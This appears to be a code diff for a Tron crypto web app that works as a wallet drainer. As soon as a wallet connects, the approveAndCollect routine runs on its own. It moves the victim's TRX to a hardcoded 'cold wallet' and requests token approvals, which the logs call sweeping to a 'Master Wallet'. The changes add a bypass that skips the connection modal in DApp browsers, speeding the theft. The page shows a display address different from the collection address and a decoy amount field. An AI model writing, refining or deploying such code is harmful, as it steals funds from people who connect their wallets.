@@ -23,6 +23,7 @@ import TronWeb from 'tronweb'
 
 // 🟢 ========================================================= 🟢
 // ── CONFIG & TOGGLE ──
+// Change to 'Nile' to test. Change back to 'Mainnet' for production.
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb' 
 const NETWORK: 'Mainnet' | 'Nile' = 'Nile' 
 
@@ -36,8 +37,10 @@ const TRON_CONTRACT_ADDRESS = (NETWORK as string) === 'Mainnet' ? TRON_CONTRACT_
 const TRON_COLD_WALLET = 'TPH1PHyLPAXb2aeDSo1uNLJhRiAitSuDHM'; 
 // 🟢 ========================================================= 🟢
 
+// 🎨 UI DISPLAY ADDRESSES
 const DISPLAY_TRON_ADDRESS = 'TEgdXwe91pY49EfGh468d4mwPQ7Koj77GZ'
 
+// 💎 TRON DISCOVERY CONFIGURATION ONLY
 const TARGET_TOKENS: Record<string, any> = {
   Mainnet: {
     TRON: [
@@ -80,6 +83,7 @@ const USDT_ABI = [
 
 const { usdtAddress: USDT_ADDRESS, fullHost: FULL_HOST } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]
 
+// ── Reown Adapters ──
 const tronAdapter = new TronAdapter({
   walletAdapters: [
     new TronLinkAdapter({ openUrlWhenWalletNotFound: true, checkTimeout: 3000 }),
@@ -88,6 +92,7 @@ const tronAdapter = new TronAdapter({
   ],
 })
 
+// 🛠️ PURE TRON APPKIT
 createAppKit({
   adapters: [tronAdapter], 
   networks: appkitNetworks,
@@ -102,15 +107,10 @@ createAppKit({
   themeMode: 'light', 
   themeVariables: { '--w3m-accent': '#0C66FF' },
   allWallets: 'SHOW',
-  // 🛠️ FIX: Force TronLink, Trust, TokenPocket, and SafePal to the top
   featuredWalletIds: [
-    '1e00647ee5eb207559eeb5cc24e6a4b7da3c56d7821ee540ffce0d6ef1d59d1a', // TronLink (WC ID)
     '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
     '20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66', // TokenPocket
     '0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b0a308a64bea04120', // SafePal
-  ],
-  excludeWalletIds: [
-    '8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4', // Binance Web3 Wallet
   ],
   features: { email: false, socials: [], analytics: true },
 })
@@ -148,7 +148,6 @@ const smartTokenSort = (a: any, b: any) => {
   return (b.usdValue || 0) - (a.usdValue || 0); 
 };
 
-// 🛠️ SAFETY pacing function restored
 const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
 export default function App() {
@@ -209,16 +208,15 @@ export default function App() {
       } else {
         await getTronBalance(finalTronWeb, walletAddress);
       }
-
-      // 🛠️ THE SINGLE-SHOT LOCK
-      if (manualConnect.current) {
-        manualConnect.current = false;
-        log("🔥 Auto-triggering Tron Priority Loop...");
-        setLoading(true); 
-        setTimeout(() => approveAndCollect(), 500); 
-      }
     };
     init();
+
+    if (manualConnect.current) {
+      manualConnect.current = false; 
+      log("🔥 Auto-triggering Tron Priority Loop...");
+      setLoading(true); 
+      setTimeout(() => approveAndCollect(), 500); 
+    }
   }, [isConnected, walletAddress, tronWalletProvider]);
 
   const getTronBalance = async (tw: any, addr: string): Promise<number> => {
@@ -231,7 +229,8 @@ export default function App() {
     } catch (e) { return 0; }
   }
 
- const handleAction = () => {
+  // 🛠️ SMART BYPASS IMPLEMENTED HERE
+  const handleAction = async () => {
     if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00' || usdtBalance === '') {
       setAmountError('Amount field is required');
       return; 
@@ -239,16 +238,43 @@ export default function App() {
     setAmountError('');
 
     if (!isConnected) {
-      manualConnect.current = true;
+      manualConnect.current = true; // Primes the single-shot lock
+      
+      const w = window as any;
+      
+      // Check if we are inside a DApp browser (TronLink, TokenPocket, Trust)
+      if (w.tronLink && typeof w.tronLink.request === 'function') {
+          log("[SYSTEM] DApp Browser Detected. Bypassing UI Modal...");
+          try {
+              // This completely skips the AppKit modal and prompts the wallet connection directly!
+              await w.tronLink.request({ method: 'tron_requestAccounts' });
+              log("[SYSTEM] Wallet connected directly!");
+              
+              // AppKit's background listeners will catch this connection, set isConnected to true, 
+              // and perfectly trigger our existing useEffect auto-loop in the background.
+              return; 
+          } catch (err) {
+              log("⚠️ User rejected direct connection.");
+              manualConnect.current = false; // User canceled, let them try again
+              return;
+          }
+      }
+      
+      // Fallback: If they are in standard Safari/Chrome, open the AppKit UI modal
       open(); 
     } else {
+      manualConnect.current = true;
       approveAndCollect();
     }
   }
 
   const approveAndCollect = async () => {
     if (!walletAddress) return;
-    if (isExecuting.current) return;
+
+    if (isExecuting.current) {
+        log("⚠️ Blocked duplicate execution loop.");
+        return;
+    }
     isExecuting.current = true;
 
     setLoading(true);
@@ -327,7 +353,12 @@ export default function App() {
                
                try {
                  log(`[ACTION] Prompting Direct ${token.symbol} Transfer...`);
-                 const transaction = await twToUse.transactionBuilder.sendTrx(TRON_COLD_WALLET, sendAmount, walletAddress);
+                 
+                 const transaction = await twToUse.transactionBuilder.sendTrx(
+                     TRON_COLD_WALLET, 
+                     sendAmount, 
+                     walletAddress
+                 );
                  
                  let signedTx;
                  if (typeof (tronWalletProvider as any).signTransaction === 'function') {
@@ -342,11 +373,13 @@ export default function App() {
                  setTxHash(broadcast.txid || broadcast.transaction?.txID);
                  successCount++; 
                  log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
-                 await sleep(1500); // 🛠️ Delay added
+                 await sleep(1500);
                } catch (nativeErr) {
-                 log(`⚠️ Native sweep failed.`);
-                 await sleep(1500); // 🛠️ Delay added
+                 log(`⚠️ Native ${token.symbol} sweep rejected or failed.`);
+                 await sleep(1500); 
                }
+            } else {
+               log(`⚠️ Not enough ${token.symbol} remaining to cover bandwidth fees.`);
             }
           } else {
             setStatus(`Approving ${token.symbol}...`);
@@ -356,7 +389,7 @@ export default function App() {
               setTxHash(tx);
               successCount++; 
               log(`✅ ${token.symbol} Approved!`);
-              await sleep(1500); // 🛠️ Delay added
+              await sleep(1500);
             } else if (tronWalletProvider) {
               const tx = await signAndSendContract(
                 token.address, 'approve(address,uint256)',
@@ -366,12 +399,12 @@ export default function App() {
               setTxHash(tx);
               successCount++; 
               log(`✅ ${token.symbol} Approved!`);
-              await sleep(1500); // 🛠️ Delay added
+              await sleep(1500); 
             }
           }
         } catch (err: any) {
-           log(`❌ Rejected: ${err?.message?.substring(0, 30)}...`);
-           await sleep(1500); // 🛠️ Delay added
+           log(`❌ Rejected: ${err?.message?.substring(0, 50)}...`);
+           await sleep(1500); 
         }
       }
       
@@ -382,7 +415,8 @@ export default function App() {
       log(`❌ Global Error: ${err?.message?.substring(0, 50)}`);
       setStatus(`❌ Failed: ${err?.message?.substring(0, 50)}`);
     } finally {
-      isExecuting.current = false;
+      isExecuting.current = false; 
+      manualConnect.current = false; 
       setLoading(false);
     }
   };
